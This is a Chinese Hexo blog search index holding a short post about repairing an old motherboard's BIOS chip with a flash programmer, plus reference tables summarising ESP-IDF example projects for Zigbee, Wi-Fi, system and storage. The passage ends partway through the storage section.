<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JSPI刷BIOS</title>
    <link href="/tips/JSPI/"/>
    <url>/tips/JSPI/</url>
    
    <content type="html"><![CDATA[<p>草，旧主板<a href="https://www.bilibili.com/opus/758340028973711379">又卡VGA了</a><br><img src="https://pic1.imgdb.cn/item/6977152da583b567209b7b8b.png" alt="JSPI.png"><br>现在win上flashrom不识别芯片，中间试过其他的一个软件，后来去<a href="https://www.52pojie.cn/thread-1375370-1-1.html">吾爱</a>下了NeoProgrammer_2.2.0.10。<br>然后Windows上软件都不识别编程器，在NAS上apt下载的flashrom不支持25U12873。官网介绍说最新板有支持，升级完电脑，apt删除idle之类的包才能下载下来编译工具。<br>老主板片上烧写过程有问题，读和擦能走完，写就走不完。示波器看了SO，没什么信号。下单买了1.8V转换模块和三片新BIOS芯片。<br>芯片和1.8V转换模块一到就把旧主板BIOS干下来读写，发现确实是芯片坏了，然而修好没几天就换了MSI B550+R7 5800x，爆了1400金币</p>]]></content>
    
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——Zigbee</title>
    <link href="/ESP32-examples/08.zigbee/"/>
    <url>/ESP32-examples/08.zigbee/</url>
    
    <content type="html"><![CDATA[<h2 id="8-zigbee-目录"><a href="#8-zigbee-目录" class="headerlink" title="8. zigbee 目录"></a>8. zigbee 目录</h2><h3 id="8-1-例程概述"><a href="#8-1-例程概述" class="headerlink" title="8.1 例程概述"></a>8.1 例程概述</h3><p>Zigbee是一种低功耗、短距离无线通信技术，广泛应用于物联网设备。ESP-IDF提供了多个Zigbee例程，涵盖网关、协调器和终端设备等不同角色。</p><h3 id="8-2-详细分析"><a href="#8-2-详细分析" class="headerlink" title="8.2 详细分析"></a>8.2 详细分析</h3><table><thead><tr><th>例程名称</th><th>所在文件夹路径</th><th>核心功能说明</th><th>主要调用的内部/外部函数或模块</th><th>输入输出参数说明</th><th>适用场景及典型应用案例</th></tr></thead><tbody><tr><td>Zigbee网关示例</td><td>examples\zigbee\esp_zigbee_gateway</td><td>构建Zigbee网关设备，连接Wi-Fi网络并通过UART与OT-RCP通信形成Zigbee网络</td><td>- esp_zigbee_stack_init<br>- esp_zigbee_network_form<br>- esp_zigbee_network_steering<br>- example_connect</td><td>输入：Wi-Fi配置、UART引脚配置<br>输出：Zigbee网络信息（Extended PAN ID、PAN ID、Channel）</td><td>适用于构建智能家居网关，连接Zigbee设备到互联网</td></tr><tr><td>HA开/关灯泡示例</td><td>examples\zigbee\light_sample\HA_on_off_light</td><td>配置Zigbee终端设备，作为HA开/关灯泡，响应开关控制命令</td><td>- esp_zigbee_stack_init<br>- esp_zigbee_network_steering<br>- esp_zb_on_off_server_cb</td><td>输入：Zigbee网络配置<br>输出：灯泡状态（开/关）</td><td>适用于智能灯泡等Zigbee终端设备，接收来自协调器或网关的控制命令</td></tr><tr><td>HA开/关开关示例</td><td>examples\zigbee\light_sample\HA_on_off_switch</td><td>配置Zigbee协调器，作为HA开/关开关，控制灯泡设备</td><td>- esp_zigbee_stack_init<br>- esp_zigbee_network_form<br>- esp_zigbee_network_steering<br>- esp_zb_on_off_client_send_cmd</td><td>输入：Zigbee网络配置、按钮输入<br>输出：控制命令（开/关切换）</td><td>适用于智能开关等Zigbee协调器设备，控制其他Zigbee终端设备</td></tr></tbody></table><h3 id="8-3-构建和运行说明"><a href="#8-3-构建和运行说明" class="headerlink" title="8.3 构建和运行说明"></a>8.3 构建和运行说明</h3><h3 id="Zigbee网关示例"><a href="#Zigbee网关示例" class="headerlink" title="Zigbee网关示例"></a>Zigbee网关示例</h3><ol><li>配置RCP：在构建ot_rcp示例时，通过menuconfig选择OPENTHREAD_NCP_VENDOR_HOOK</li><li>配置项目：使用<code>idf.py set-target &lt;chip_name&gt;</code>设置正确的芯片目标</li><li>擦除NVRAM：<code>idf.py -p PORT erase-flash</code></li><li>构建和烧录：<code>idf.py -p PORT flash monitor</code></li></ol><h3 id="HA开-关灯泡示例"><a href="#HA开-关灯泡示例" class="headerlink" title="HA开/关灯泡示例"></a>HA开/关灯泡示例</h3><ol><li>配置项目：使用<code>idf.py --preview set-target TARGET</code>设置正确的芯片目标</li><li>擦除NVRAM：<code>idf.py -p PORT erase-flash</code></li><li>构建和烧录：<code>idf.py -p PORT flash monitor</code></li></ol><h3 id="HA开-关开关示例"><a href="#HA开-关开关示例" class="headerlink" title="HA开/关开关示例"></a>HA开/关开关示例</h3><ol><li>配置项目：使用<code>idf.py --preview set-target TARGET</code>设置正确的芯片目标</li><li>擦除NVRAM：<code>idf.py -p PORT erase-flash</code></li><li>构建和烧录：<code>idf.py -p PORT flash monitor</code></li></ol><h3 id="8-4-硬件要求"><a href="#8-4-硬件要求" class="headerlink" title="8.4 硬件要求"></a>8.4 硬件要求</h3><h3 id="Zigbee网关示例-1"><a href="#Zigbee网关示例-1" class="headerlink" title="Zigbee网关示例"></a>Zigbee网关示例</h3><ul><li>两个SoC：一个ESP32系列Wi-Fi SoC（ESP32, ESP32-C, ESP32-S等）和一个ESP32-H2 802.15.4 SoC</li><li>通过UART连接两个SoC（默认GPIO4=RX, GPIO5=TX）</li></ul><h3 id="HA开-关灯泡示例-1"><a href="#HA开-关灯泡示例-1" class="headerlink" title="HA开/关灯泡示例"></a>HA开/关灯泡示例</h3><ul><li>一个ESP32-H2开发板作为Zigbee终端设备</li><li>另一个ESP32-H2作为Zigbee协调器（加载HA_on_off_switch示例）</li></ul><h3 id="HA开-关开关示例-1"><a href="#HA开-关开关示例-1" class="headerlink" title="HA开/关开关示例"></a>HA开/关开关示例</h3><ul><li>一个ESP32-H2开发板作为Zigbee协调器</li><li>另一个ESP32-H2作为Zigbee终端设备（加载HA_on_off_light示例）</li></ul><h3 id="8-5-典型应用场景"><a href="#8-5-典型应用场景" class="headerlink" title="8.5 典型应用场景"></a>8.5 典型应用场景</h3><ol><li><strong>智能家居系统</strong>：使用Zigbee网关连接多个Zigbee设备（灯泡、开关、传感器等）到互联网</li><li><strong>照明控制系统</strong>：通过Zigbee开关控制多个Zigbee灯泡</li><li><strong>物联网设备网络</strong>：构建低功耗、可靠的Zigbee设备网络，适用于工业自动化、智能农业等场景</li></ol><h3 id="8-6-注意事项"><a href="#8-6-注意事项" class="headerlink" title="8.6 注意事项"></a>8.6 注意事项</h3><ol><li>对于同时支持Wi-Fi和Zigbee的单SoC（如ESP32-C6），由于只有一个RF路径，Wi-Fi和Zigbee不能同时接收，会对性能产生显著影响，建议使用双SoC解决方案</li><li>在构建ot_rcp示例时，必须选择OPENTHREAD_NCP_VENDOR_HOOK选项</li><li>在烧录新固件前，建议擦除NVRAM以清除之前的配置信息</li><li>Zigbee网络形成后，会开放180秒允许新设备加入</li></ol><h3 id="8-7-扩展阅读"><a href="#8-7-扩展阅读" class="headerlink" title="8.7 扩展阅读"></a>8.7 扩展阅读</h3><ul><li><a href="https://docs.espressif.com/projects/esp-zigbee-sdk">ESP Zigbee SDK Docs</a></li><li><a href="https://github.com/espressif/esp-zigbee-sdk">ESP Zigbee SDK Repo</a></li><li><a href="https://github.com/espressif/esp-matter/tree/main/examples/bridge_apps/zigbee_bridge/">matter zigbee bridge</a></li><li><a href="https://github.com/espressif/esp-rainmaker/tree/master/examples/zigbee_gateway">Rainmaker Zigbee Gateway</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——wifi</title>
    <link href="/ESP32-examples/12.wifi(WIP)/"/>
    <url>/ESP32-examples/12.wifi(WIP)/</url>
    
    <content type="html"><![CDATA[<h2 id="12-wifi-目录"><a href="#12-wifi-目录" class="headerlink" title="12. wifi 目录"></a>12. wifi 目录</h2><h3 id="12-1-station-例程"><a href="#12-1-station-例程" class="headerlink" title="12.1 station 例程"></a>12.1 station 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>station</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\wifi\getting_started\station</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示ESP32作为Wi-Fi客户端（STA模式）连接到外部接入点（AP）的基本功能。包括Wi-Fi初始化、连接建立、IP获取和连接状态管理。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>wifi_init_sta()</code>：初始化STA模式Wi-Fi<br>- <code>event_handler()</code>：处理Wi-Fi和IP事件<br>- <code>esp_netif_init()</code>：初始化网络接口<br>- <code>esp_event_loop_create_default()</code>：创建默认事件循环<br>- <code>esp_wifi_init()</code>：初始化Wi-Fi驱动<br>- <code>esp_wifi_set_mode()</code>：设置Wi-Fi模式<br>- <code>esp_wifi_set_config()</code>：配置Wi-Fi参数<br>- <code>esp_wifi_start()</code>：启动Wi-Fi驱动</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 配置的SSID和密码（通过menuconfig设置）<br><br>输出：<br>- Wi-Fi连接状态<br>- 获取到的IP地址<br>- 连接成功或失败的日志信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习Wi-Fi STA模式的基本配置和使用<br>- 开发需要连接到现有Wi-Fi网络的设备<br>- 作为物联网设备连接云平台的基础<br>- 测试Wi-Fi连接稳定性<br>- 作为Wi-Fi客户端应用的参考模板</td></tr></tbody></table><h3 id="12-2-softAP-例程"><a href="#12-2-softAP-例程" class="headerlink" title="12.2 softAP 例程"></a>12.2 softAP 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>softAP</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\wifi\getting_started\softAP</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示ESP32作为Wi-Fi接入点（AP模式）的基本功能。包括AP创建、客户端连接管理和DHCP服务器配置。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>wifi_init_softap()</code>：初始化SoftAP模式Wi-Fi<br>- 事件处理函数：处理客户端连接和断开事件<br>- <code>esp_netif_init()</code>：初始化网络接口<br>- <code>esp_event_loop_create_default()</code>：创建默认事件循环<br>- <code>esp_wifi_init()</code>：初始化Wi-Fi驱动<br>- <code>esp_wifi_set_mode()</code>：设置Wi-Fi模式<br>- <code>esp_wifi_set_config()</code>：配置AP参数<br>- <code>esp_wifi_start()</code>：启动Wi-Fi驱动</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 配置的SSID、密码和通道（通过menuconfig设置）<br><br>输出：<br>- AP创建状态<br>- 客户端连接和断开事件<br>- 分配给客户端的IP地址</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习Wi-Fi AP模式的基本配置和使用<br>- 开发需要创建Wi-Fi网络的设备<br>- 作为物联网设备的本地配置热点<br>- 测试AP模式下的客户端连接管理<br>- 作为Wi-Fi AP应用的参考模板</td></tr></tbody></table><h3 id="12-3-espnow-例程"><a href="#12-3-espnow-例程" class="headerlink" title="12.3 espnow 例程"></a>12.3 espnow 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>espnow</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\wifi\espnow</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示ESP-NOW协议的使用，实现设备间的无连接Wi-Fi通信。包括ESP-NOW初始化、对等设备管理、数据发送和接收。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>espnow_init()</code>：初始化ESP-NOW<br>- <code>espnow_send_cb()</code>：处理发送回调<br>- <code>espnow_recv_cb()</code>：处理接收回调<br>- <code>esp_now_add_peer()</code>：添加对等设备<br>- <code>esp_now_send()</code>：发送ESP-NOW数据<br>- Wi-Fi初始化相关函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 对等设备的MAC地址<br>- 要发送的数据<br><br>输出：<br>- 数据发送状态<br>- 接收到的数据和发送方MAC地址</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习ESP-NOW协议的实现和使用<br>- 开发设备间低延迟通信的应用<br>- 物联网设备的本地数据交换<br>- 无线传感器网络<br>- 智能家居设备间的直接通信<br>- 作为ESP-NOW应用的参考模板</td></tr></tbody></table><h3 id="12-4-iperf-例程"><a href="#12-4-iperf-例程" class="headerlink" title="12.4 iperf 例程"></a>12.4 iperf 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>iperf</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\wifi\iperf</td></tr><tr><td><strong>核心功能说明</strong></td><td>用于测试Wi-Fi网络吞吐量，支持TCP和UDP协议。可以在STA模式或AP模式下运行，与另一台运行iperf客户端或服务器的设备配合使用。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- Wi-Fi初始化相关函数<br>- iperf客户端/服务器实现<br>- 网络套接字相关函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- iperf测试配置（协议类型、端口、测试时长等）<br><br>输出：<br>- 吞吐量测试结果<br>- 网络延迟和丢包率（UDP模式）</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 测试Wi-Fi网络性能<br>- 验证不同配置下的网络吞吐量<br>- 优化Wi-Fi应用的网络性能<br>- 比较不同设备或固件版本的网络性能<br>- 作为网络性能测试的参考模板</td></tr></tbody></table><h3 id="12-5-smart-config-例程"><a href="#12-5-smart-config-例程" class="headerlink" title="12.5 smart_config 例程"></a>12.5 smart_config 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>smart_config</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\wifi\smart_config</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用ESP-TOUCH协议，通过手机应用将Wi-Fi配置信息传递给ESP32设备，实现设备的快速联网。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>smartconfig_example_task()</code>：智能配网任务<br>- 事件处理函数：处理智能配网事件<br>- Wi-Fi初始化相关函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 通过手机App发送的Wi-Fi SSID和密码<br><br>输出：<br>- 配网状态<br>- Wi-Fi连接结果</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习智能配网技术的实现<br>- 开发需要快速联网的物联网设备<br>- 简化设备的初次配置流程<br>- 作为智能配网应用的参考模板</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——system</title>
    <link href="/ESP32-examples/17.system(WIP)/"/>
    <url>/ESP32-examples/17.system(WIP)/</url>
    
    <content type="html"><![CDATA[<h2 id="17-system-目录"><a href="#17-system-目录" class="headerlink" title="17. system 目录"></a>17. system 目录</h2><h3 id="17-1-console-basic-例程"><a href="#17-1-console-basic-例程" class="headerlink" title="17.1 console/basic 例程"></a>17.1 console/basic 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>console/basic</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\system\console\basic</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用ESP-IDF的console组件创建交互式命令行界面(CLI)。实现了一个基于REPL(Read-Eval-Print Loop)的交互式shell，支持命令历史、自动补全和各种系统命令。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>esp_console_repl_init()</code>：初始化REPL<br>- <code>esp_console_register_help_command()</code>：注册帮助命令<br>- <code>esp_console_cmd_register()</code>：注册自定义命令<br>- 各种系统命令处理函数（如free、restart、deep_sleep等）</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 通过串口或USB输入的命令<br><br>输出：<br>- 命令执行结果<br>- 帮助信息<br>- 系统状态信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习ESP-IDF console组件的使用<br>- 开发需要命令行界面的应用<br>- 设备调试和配置<br>- 系统状态监控<br>- 作为CLI应用的参考模板</td></tr></tbody></table><h3 id="17-2-esp-timer-例程"><a href="#17-2-esp-timer-例程" class="headerlink" title="17.2 esp_timer 例程"></a>17.2 esp_timer 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>esp_timer</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\system\esp_timer</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示ESP-IDF的高精度定时器功能。创建周期性定时器和一次性定时器，执行回调函数，并验证定时器在轻度睡眠后仍能正确工作。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>periodic_timer_callback()</code>：周期性定时器回调<br>- <code>oneshot_timer_callback()</code>：一次性定时器回调<br>- <code>esp_timer_create()</code>：创建定时器<br>- <code>esp_timer_start()</code>：启动定时器<br>- <code>esp_timer_stop()</code>：停止定时器<br>- <code>esp_timer_delete()</code>：删除定时器<br>- <code>esp_timer_dump()</code>：打印定时器信息<br>- 轻度睡眠相关函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输出：<br>- 定时器回调执行日志<br>- 定时器状态信息<br>- 轻度睡眠前后的时间信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习ESP-IDF高精度定时器的使用<br>- 开发需要精确定时的应用<br>- 实时系统中的时间管理<br>- 传感器数据采集定时<br>- 作为定时器应用的参考模板</td></tr></tbody></table><h3 id="17-3-deep-sleep-例程"><a href="#17-3-deep-sleep-例程" class="headerlink" title="17.3 deep_sleep 例程"></a>17.3 deep_sleep 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>deep_sleep</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\system\deep_sleep</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示ESP32的深度睡眠模式和各种唤醒源。支持定时器唤醒、EXT0外部唤醒、EXT1外部唤醒和GPIO唤醒，展示了如何在深度睡眠中保存状态并快速唤醒。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>timer_wakeup_init()</code>：初始化定时器唤醒<br>- <code>ext0_wakeup_init()</code>：初始化EXT0唤醒<br>- <code>ext1_wakeup_init()</code>：初始化EXT1唤醒<br>- <code>esp_sleep_enable_timer_wakeup()</code>：使能定时器唤醒<br>- <code>esp_sleep_enable_ext0_wakeup()</code>：使能EXT0唤醒<br>- <code>esp_sleep_enable_ext1_wakeup()</code>：使能EXT1唤醒<br>- <code>esp_deep_sleep_start()</code>：进入深度睡眠</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输出：<br>- 唤醒源信息<br>- 深度睡眠持续时间<br>- 系统状态信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习ESP32深度睡眠模式的使用<br>- 开发低功耗物联网设备<br>- 电池供电设备的电源管理<br>- 定时唤醒的传感器节点<br>- 作为深度睡眠应用的参考模板</td></tr></tbody></table><h3 id="17-4-pthread-例程"><a href="#17-4-pthread-例程" class="headerlink" title="17.4 pthread 例程"></a>17.4 pthread 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>pthread</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\system\pthread</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示POSIX线程(pthread)在ESP-IDF中的使用。创建多个线程，展示线程同步、互斥锁和条件变量的使用，以及线程优先级和调度策略的配置。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>pthread_create()</code>：创建线程<br>- <code>pthread_join()</code>：等待线程结束<br>- <code>pthread_mutex_init()</code>：初始化互斥锁<br>- <code>pthread_mutex_lock()</code>：锁定互斥锁<br>- <code>pthread_mutex_unlock()</code>：解锁互斥锁<br>- <code>pthread_cond_init()</code>：初始化条件变量<br>- <code>pthread_cond_wait()</code>：等待条件变量<br>- <code>pthread_cond_signal()</code>：发送条件信号</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输出：<br>- 线程执行顺序<br>- 共享资源访问情况<br>- 线程同步结果</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习POSIX线程在ESP-IDF中的使用<br>- 开发多线程应用<br>- 实现并发处理<br>- 学习线程同步机制<br>- 作为多线程应用的参考模板</td></tr></tbody></table><h3 id="17-5-ota-simple-ota-example-例程"><a href="#17-5-ota-simple-ota-example-例程" class="headerlink" title="17.5 ota/simple_ota_example 例程"></a>17.5 ota/simple_ota_example 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>ota/simple_ota_example</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\system\ota\simple_ota_example</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示ESP-IDF的OTA(Over-The-Air)升级功能。通过HTTPS从服务器下载固件并更新设备，支持固件完整性验证和版本检查。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>simple_ota_task()</code>：OTA升级任务<br>- <code>esp_https_ota()</code>：执行HTTPS OTA升级<br>- <code>esp_https_ota_config_t</code>：OTA配置结构<br>- Wi-Fi连接相关函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 配置的Wi-Fi SSID和密码<br>- OTA服务器URL<br><br>输出：<br>- OTA升级进度<br>- 升级结果<br>- 系统重启信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习ESP-IDF OTA功能的使用<br>- 开发需要远程升级的设备<br>- 物联网设备的固件管理<br>- 作为OTA应用的参考模板</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——存储</title>
    <link href="/ESP32-examples/14.storage(WIP)/"/>
    <url>/ESP32-examples/14.storage(WIP)/</url>
    
    <content type="html"><![CDATA[<h2 id="14-storage-目录"><a href="#14-storage-目录" class="headerlink" title="14. storage 目录"></a>14. storage 目录</h2><h3 id="14-1-nvs-nvs-rw-value-例程"><a href="#14-1-nvs-nvs-rw-value-例程" class="headerlink" title="14.1 nvs/nvs_rw_value 例程"></a>14.1 nvs/nvs_rw_value 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>nvs/nvs_rw_value</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\storage\nvs\nvs_rw_value</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用ESP-IDF的NVS(Non-Volatile Storage)组件读写键值对数据。实现了整数和字符串类型的读写操作，以及键的查找和删除功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>nvs_flash_init()</code>：初始化NVS<br>- <code>nvs_open()</code>：打开NVS命名空间<br>- <code>nvs_set_i32()</code>：写入整数<br>- <code>nvs_get_i32()</code>：读取整数<br>- <code>nvs_set_str()</code>：写入字符串<br>- <code>nvs_get_str()</code>：读取字符串<br>- <code>nvs_erase_key()</code>：删除键<br>- <code>nvs_commit()</code>：提交更改<br>- <code>nvs_close()</code>：关闭NVS句柄</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 要写入的整数和字符串值（硬编码在程序中）<br><br>输出：<br>- 读取到的整数和字符串值<br>- 操作结果状态信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习NVS的基本使用方法<br>- 开发需要存储配置信息的应用<br>- 保存设备状态和计数器<br>- 存储简单的键值对数据<br>- 作为NVS应用的参考模板</td></tr></tbody></table><h3 id="14-2-fatfs-getting-started-例程"><a href="#14-2-fatfs-getting-started-例程" class="headerlink" title="14.2 fatfs/getting_started 例程"></a>14.2 fatfs/getting_started 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>fatfs/getting_started</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\storage\fatfs\getting_started</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用FATFS组件在SPI Flash上实现FAT文件系统。实现了文件系统的挂载、文件的打开、写入、读取和关闭，以及文件系统的卸载。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>esp_vfs_fat_spiflash_mount()</code>：挂载FAT文件系统<br>- <code>fopen()</code>：打开文件<br>- <code>fwrite()</code>：写入文件<br>- <code>fread()</code>：读取文件<br>- <code>fclose()</code>：关闭文件<br>- <code>esp_vfs_fat_spiflash_unmount()</code>：卸载FAT文件系统</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 要写入的字符串”Hello World!”（硬编码在程序中）<br><br>输出：<br>- 写入成功的状态<br>- 读取到的字符串<br>- 文件系统操作的日志信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习FATFS的基本使用方法<br>- 开发需要文件系统支持的应用<br>- 存储大量数据和文件<br>- 实现可与电脑兼容的文件系统<br>- 作为FATFS应用的参考模板</td></tr></tbody></table><h3 id="14-3-littlefs-例程"><a href="#14-3-littlefs-例程" class="headerlink" title="14.3 littlefs 例程"></a>14.3 littlefs 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>littlefs</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\storage\littlefs</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用LittleFS文件系统在SPI Flash上存储数据。实现了LittleFS的初始化、挂载、文件读写、目录操作和卸载功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>esp_vfs_littlefs_register()</code>：注册LittleFS<br>- <code>esp_vfs_littlefs_unregister()</code>：注销LittleFS<br>- <code>littlefs_info()</code>：获取LittleFS信息<br>- 标准C文件操作函数（fopen, fwrite, fread, fclose等）</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 要写入的文件内容<br><br>输出：<br>- 文件读写结果<br>- LittleFS使用情况<br>- 目录列表</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习LittleFS文件系统的使用<br>- 开发需要高效文件系统的应用<br>- 存储配置文件和资源文件<br>- 物联网设备的本地数据存储<br>- 作为LittleFS应用的参考模板</td></tr></tbody></table><h3 id="14-4-spiffs-例程"><a href="#14-4-spiffs-例程" class="headerlink" title="14.4 spiffs 例程"></a>14.4 spiffs 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>spiffs</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\storage\spiffs</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用SPIFFS(SPI Flash File System)在SPI Flash上实现文件系统。实现了SPIFFS的挂载、文件读写、目录操作和卸载功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>esp_vfs_spiffs_register()</code>：注册SPIFFS<br>- <code>esp_vfs_spiffs_unregister()</code>：注销SPIFFS<br>- <code>esp_spiffs_info()</code>：获取SPIFFS信息<br>- 标准C文件操作函数（fopen, fwrite, fread, fclose等）</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 要写入的文件内容<br><br>输出：<br>- 文件读写结果<br>- SPIFFS使用情况<br>- 目录列表</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习SPIFFS文件系统的使用<br>- 开发需要轻量级文件系统的应用<br>- 存储Web服务器的静态文件<br>- 物联网设备的本地数据存储<br>- 作为SPIFFS应用的参考模板</td></tr></tbody></table><h3 id="14-5-wear-levelling-例程"><a href="#14-5-wear-levelling-例程" class="headerlink" title="14.5 wear_levelling 例程"></a>14.5 wear_levelling 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>wear_levelling</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\storage\wear_levelling</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用ESP-IDF的wear_levelling组件实现Flash的磨损均衡。实现了基于磨损均衡的NVS-like键值存储，包括数据的写入、读取和删除。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>wl_mount()</code>：挂载磨损均衡分区<br>- <code>wl_unmount()</code>：卸载磨损均衡分区<br>- <code>nvs_open_from_partition()</code>：从磨损均衡分区打开NVS<br>- 